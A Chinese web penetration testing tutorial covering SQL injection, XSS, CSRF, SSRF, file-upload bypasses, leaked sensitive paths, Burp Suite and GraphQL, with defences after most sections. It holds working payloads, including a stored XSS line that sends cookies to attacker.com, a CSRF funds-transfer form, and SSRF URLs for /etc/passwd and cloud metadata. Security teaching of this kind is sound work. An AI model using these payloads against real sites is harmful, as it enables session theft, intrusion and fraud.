# Web 渗透测试完整指南

> OWASP Top 10 漏洞原理与利用，Burp Suite 实战技巧

## 目录
- [⚠️ 免责声明](#免责声明)
- [一、渗透测试流程](#渗透测试流程)
- [二、SQL 注入](#sql-注入)
- [三、XSS（跨站脚本攻击）](#xss-跨站脚本攻击)
- [四、CSRF（跨站请求伪造）](#csrf-跨站请求伪造)
- [五、SSRF（服务器端请求伪造）](#ssrf-服务器端请求伪造)
- [六、文件上传漏洞](#文件上传漏洞)
- [七、敏感信息泄露](#敏感信息泄露)
- [八、Burp Suite 实战技巧](#burp-suite-实战技巧)
- [九、API 安全测试](#api-安全测试)

---


## ⚠️ 免责声明

**本文仅供学习网络安全原理和进行授权的安全测试使用。所有测试必须在拥有合法授权的系统上进行。**

---

## 一、渗透测试流程

```
信息收集 → 漏洞探测 → 漏洞利用 → 权限提升 → 维持访问 → 清理痕迹 → 报告
```

---

## 二、SQL 注入

### 原理

用户输入被当作 SQL 语句的一部分执行，导致攻击者可以：
- 获取数据库中的任意数据
- 绕过登录验证
- 执行系统命令（xp_cmdshell）

### 常见类型

**1. 基于错误的注入**

```
URL: http://target.com/product?id=1
正常查询: SELECT * FROM products WHERE id=1
注入后: SELECT * FROM products WHERE id=1 UNION SELECT 1,version(),user(),4,5--
```

**2. Boolean 盲注**

```
正常:   http://target.com/product?id=1 AND 1=1     → 返回正常页面
测试:   http://target.com/product?id=1 AND 1=2     → 返回空或异常
猜解:   http://target.com/product?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
```

**3. 时间盲注**

```
http://target.com/product?id=1; IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

### 防御措施

```sql
-- 使用参数化查询（PDO / Prepared Statements）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

-- 白名单验证
-- 使用 ORM
-- 限制数据库用户权限
```

---

## 三、XSS（跨站脚本攻击）

### 三种类型

**1. 反射型 XSS**
```html
<!-- URL 参数直接渲染 -->
<!-- https://target.com/search?q=<script>alert(document.cookie)</script> -->
<p>搜索结果: <script>alert(document.cookie)</script></p>
```

**2. 存储型 XSS**
```html
<!-- 评论内容被存入数据库，所有访问该页面的用户都会中招 -->
留言: <img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

**3. DOM 型 XSS**
```js
// JavaScript 直接读取 URL 参数并写入页面
const params = new URLSearchParams(location.search)
document.write("欢迎 " + params.get("name"))
// → ?name=<img src=x onerror=alert(1)>
```

### 常见 Payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<svg><animate onbegin=alert(1) attributeName=x>
```

### 防御措施

```html
<!-- 1. HTML 转义 -->
<!-- 将 < > " ' & 转义为 &lt; &gt; &quot; &#x27; &amp; -->

<!-- 2. Content-Security-Policy -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">

<!-- 3. HTTPOnly Cookie -->
Set-Cookie: session=xxx; HttpOnly; Secure
```

---

## 四、CSRF（跨站请求伪造）

### 原理

用户在登录状态下访问了恶意页面，该页面自动以用户身份发起请求。

### 攻击示例

```html
<!-- 恶意页面自动提交表单 -->
<html>
<body>
  <form action="https://target.com/transfer" method="POST" id="csrf">
    <input name="to" value="attacker" />
    <input name="amount" value="10000" />
  </form>
  <script>document.getElementById('csrf').submit()</script>
</body>
</html>
```

### 防御措施

```html
<!-- 1. CSRF Token -->
<form>
  <input type="hidden" name="csrf_token" value="随机令牌">
</form>

<!-- 2. SameSite Cookie -->
Set-Cookie: session=xxx; SameSite=Strict

<!-- 3. 验证 Referer / Origin 头 -->
```

---

## 五、SSRF（服务器端请求伪造）

### 原理

服务器代替用户发起请求，攻击者可利用此功能：
- 访问内网服务
- 读取本地文件（file://）
- 扫描内网端口
- 利用 Gopher 协议攻击 Redis/MySQL

### 攻击示例

```bash
# SSRF 读取本地文件
http://target.com/fetch?url=file:///etc/passwd

# SSRF 扫描内网
http://target.com/fetch?url=http://192.168.1.1:22

# SSRF 探测云元数据
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

# SSRF 攻击 Redis
http://target.com/fetch?url=gopher://127.0.0.1:6379/_SET%20foo%20bar
```

### 防御措施

```python
# 禁止内网 IP
import ipaddress

def is_private(ip):
    try:
        return ipaddress.ip_address(ip).is_private
    except:
        return True

# 禁止危险协议
ALLOWED_SCHEMES = ['http', 'https']
```

---

## 六、文件上传漏洞

### 常见绕过

```bash
# 大小写绕过
shell.PhP

# 空字节
shell.php%00.jpg

# 双写扩展名
shell.jpg.php

# MIME 类型绕过
Content-Type: image/jpeg

# 竞争上传（来不及删除）
# .htaccess 上传竞争条件

# 解析漏洞（Apache / Nginx 解析）
shell.jpg → Apache 从右向左解析 → shell.php
```

### 防御措施

```python
# 1. 白名单扩展名
ALLOWED_EXT = ['jpg', 'png', 'gif']
ext = os.path.splitext(filename)[1].lower()
if ext not in ALLOWED_EXT: reject()

# 2. 重命名文件
new_name = uuid.uuid4().hex + ext
saved_path = os.path.join(UPLOAD_DIR, new_name)

# 3. 验证文件内容（Magic Bytes）
# 4. 上传目录禁止执行
# 5. ImageMagick 安全策略
```

---

## 七、敏感信息泄露

### 常见泄露点

```bash
# Git 信息泄露
/.git/config
/.git/HEAD
/.git/logs/HEAD
/.git/objects/

# 备份文件
/.bak
/.swp
/.swo
/.sql
/database.sql

# 配置文件
/.env
/config.php
/web.config
/application.properties

# 目录遍历

---

## 八、Burp Suite 实战技巧

### 常用功能

```
1. Proxy → Intercept：拦截和修改请求
2. Repeater：重放修改后的请求
3. Intruder：暴力破解/参数 fuzzing
4. Decoder：编码/解码工具
5. Comparer：比较两个响应差异
6. Target → Scope：限定测试范围
```

### Intruder 攻击类型

| 类型 | 用途 |
|------|------|
| Sniper | 一个参数，多个字典 |
| Battering Ram | 多个参数，同一个字典 |
| Pitchfork | 多个参数，每个对应一个字典（一一配对）|
| Cluster Bomb | 多个参数，字典交叉组合 |

### 常用 Burp 插件

- **JWT Editor**：JWT 令牌编辑
- **Active Scan++**：增强主动扫描
- **SQLMap Scanner**：集成 SQLMap
- **Backslash Powered Scanner**：检测更隐蔽的漏洞

---

## 九、API 安全测试

```bash
# REST API 常见漏洞
# 1. 过度数据暴露
# 2. 缺乏速率限制
# 3. 身份验证失效
# 4. Mass Assignment

# GraphQL 渗透
# Introspection 查询
POST /graphql
{"query": "{ __schema { types { name } } }"}

# 列出字段
{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}
```
